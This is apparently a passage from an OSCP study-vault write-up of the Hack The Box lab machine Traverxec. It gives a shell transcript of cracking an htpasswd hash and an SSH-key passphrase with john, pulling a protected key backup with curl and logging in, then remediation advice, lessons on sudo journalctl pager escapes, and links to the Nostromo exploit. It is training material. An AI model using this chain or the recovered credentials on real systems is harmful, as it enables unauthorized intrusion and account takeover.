ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCsXrsMQc0U71GVXMQcTOYIH2ZvCwpxTxN1jOYbTutvNyYThEIjYpCVs5DKhZi2rNunI8Z+Ey/FC9bpmCiJtao0xxIbJ02c+H6q13aAFrTv61GAzi5neX4Lj2E/pIhd3JBFYRIQw97C66MO3UVqxKcnGrCvYnhJvKMw7nSRI/cXTPHAEnwU0+NW2zBKId8cRRLxGFyM49pjDZPsAVgGlfdBD380vVa9dMrJ/T13vDTZZGoDgcq9gRtD1B6NJoLHaRWH4ikRuQvLWjk3nWDDaRjw6MxmRtLk8h0MM7+IiBYc6NJvbQzpG5M5oM0FvhawQetN71KcZ4jUVxN3m+YkaqHD david@traverxec
```

#### `loot/htpasswd.hash`

```text
david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
```

### Sensitive transcript evidence

```text
[sudo] password for kali:
www-data@traverxec:/usr/bin$ cat /etc/passwd | grep -v nologin | grep -v false
[sudo] password for www-data:
$ [14:21:26] echo 'david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/' > /home/kali/Platforms/HackTheBox/Traverxec/loot/htpasswd.hash
$ [14:22:23] john --wordlist=/usr/share/wordlists/rockyou.txt loot/htpasswd.hash
$ [14:22:44] john --show loot/htpasswd.hash
$ [14:23:00] boxset Password Nowonly4me
kali@kali:~/Platforms/HackTheBox/Traverxec [14:21:19] $ =echo 'david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/' > /home/kali/Platforms/HackTheBox/Traverxec/loot/htpasswd.hashecho 'david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/' >>
kali@kali:~/Platforms/HackTheBox/Traverxec [14:21:26] $ =john --wordlist=/usr/share/wordlists/rockyou.txt loot/htpasswd.hashjohnloot/htpasswd.hash>
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
kali@kali:~/Platforms/HackTheBox/Traverxec [14:22:24] $ =john --show loot/htpasswd.hashjohnloot/htpasswd.hash>
kali@kali:~/Platforms/HackTheBox/Traverxec [14:22:44] $ =boxset Password Nowonly4meboxset>
[+] Password=Nowonly4me (saved to .env)
$ [14:26:07] curl -u "david:$Password" \
kali@kali:~/Platforms/HackTheBox/Traverxec [14:25:49] $ =curl -u "david:$Password" \
  -o loot/backup-ssh-identity-files.tgzcurl"david:$Password""http://$BoxIP/~david/protected-file-area/backup-ssh-identity-files.tgz">
$ [14:26:55] chmod 600 loot/home/david/.ssh/id_rsa
$ [14:27:14] ssh2john loot/home/david/.ssh/id_rsa > loot/david-id-rsa.john
kali@kali:~/Platforms/HackTheBox/Traverxec [14:26:39] $ =chmod 600 loot/home/david/.ssh/id_rsa
kali@kali:~/Platforms/HackTheBox/Traverxec [14:26:55] $ =ssh2john loot/home/david/.ssh/id_rsa > loot/david-id-rsa.john
john --wordlist=/usr/share/wordlists/rockyou.txt loot/david-id-rsa.johnssh2john loot/home/david/.ssh/id_rsa >
loot/home/david/.ssh/id_rsa:hunter
$ [14:28:18] boxset Password2 hunter
$ [14:28:35] ssh -i loot/home/david/.ssh/id_rsa david@$BoxIP
$ [14:30:40] loot flag user b7e3eaa1e9e86cf7933d6760babc5e6a
kali@kali:~/Platforms/HackTheBox/Traverxec [14:30:39] $ =loot flag user b7e3eaa1e9e86cf7933d6760babc5e6aloot>
[+] Flag saved:  user = b7e3eaa1e9e86cf7933d6760babc5e6a  →  loot/flags.txt
[Jkali@kali:~/Platforms/HackTheBox/Traverxec [14:27:28] $ =boxset Password2 hunterboxset>
[+] Password2=hunter (saved to .env)
kali@kali:~/Platforms/HackTheBox/Traverxec [14:28:18] $ =ssh -i loot/home/david/.ssh/id_rsa david@$BoxIPsshloot/home/david/.ssh/id_rsa>
Enter passphrase for key 'loot/home/david/.ssh/id_rsa':
[sudo] password for david:
sudo: 2 incorrect password attempts
sudo: a password is required
$ [14:37:19] loot flag root 6fd96006190e930c6f5a7168d4fee710
```


## Remediation recommendations

| Finding | Recommendation |
|---|---|
| Initial access path on Traverxec | Remove or patch the vulnerable service, restrict exposure, and rotate any credentials recovered during testing. |
| Privilege escalation path | Remove the misconfiguration, enforce least privilege, and verify the corrected permissions or policy. |
| Assessment artifacts | Remove payloads and temporary files, restore modified files, and review logs for the test activity. |

## Lessons learned and vault links

1. A versioned service banner should immediately feed the exploit-search branch.
2. Read custom service configuration after RCE. One file can disclose authentication, document roots, and home-directory mappings.
3. A 401 response is positive enumeration evidence because the resource exists and is protected.
4. Crack exposed authentication material offline instead of brute-forcing the live service.
5. Treat an encrypted SSH key as a separate credential artifact and validate it before debugging the network login.
6. Read sudo rules in the context of the command that uses them. Arguments can be as important as the binary name.
7. Pager escapes are command execution primitives. A sudo permission for a log viewer may be more powerful than it first appears.

### Related boxes

- [[OSCP/BOXES/WRITE UPS/Linux/Poison|Poison]] -- LFI, private credential recovery, SSH access, and an internal service pivot
- [[OSCP/BOXES/WRITE UPS/Linux/Valentine|Valentine]] -- memory disclosure, encrypted SSH-key handling, and Unix-session abuse
- [[OSCP/BOXES/WRITE UPS/Linux/OpenAdmin|OpenAdmin]] -- web enumeration, credential recovery, and a sudo editor escape
- [[OSCP/BOXES/WRITE UPS/Linux/Networked|Networked]] -- web RCE, source/config review, and sudo-driven escalation
- [[OSCP/BOXES/WRITE UPS/Linux/TartarSauce|TartarSauce]] -- web foothold and a different command-line privilege-escalation primitive

## External resources

- [NVD: CVE-2019-16278](https://nvd.nist.gov/vuln/detail/CVE-2019-16278)
- [Exploit-DB 47837: Nostromo 1.9.6 RCE](https://www.exploit-db.com/exploits/47837)
- [GTFOBins: journalctl](https://gtfobins.github.io/gtfobins/journalctl/)
- [journalctl manual](https://man7.org/linux/man-pages/man1/journalctl.1.html)
- [Nostromo web server](https://www.nostromo.ch/)

## Related RUNBOOK V2 stages

- [[RUNBOOK V2/Start Here]]
- [[RUNBOOK V2/Linux - Service Scan]]
- [[RUNBOOK V2/Linux - Web Enum]]
- [[RUNBOOK V2/Linux - Shell Stabilise]]
- [[RUNBOOK V2/Linux - Local Enum]]
- [[RUNBOOK V2/Linux - Clean Down]]

## Why this matters for OSCP

This box is a compact example of chaining low-noise enumeration, a reviewed public exploit, offline credential cracking, SSH key validation, and an argument-specific sudo rule. The chain is repeatable under exam pressure because every transition is supported by a concrete artifact: the service banner, the Nostromo configuration, the protected archive, the encrypted key, the helper script, and the exact `journalctl` invocation.
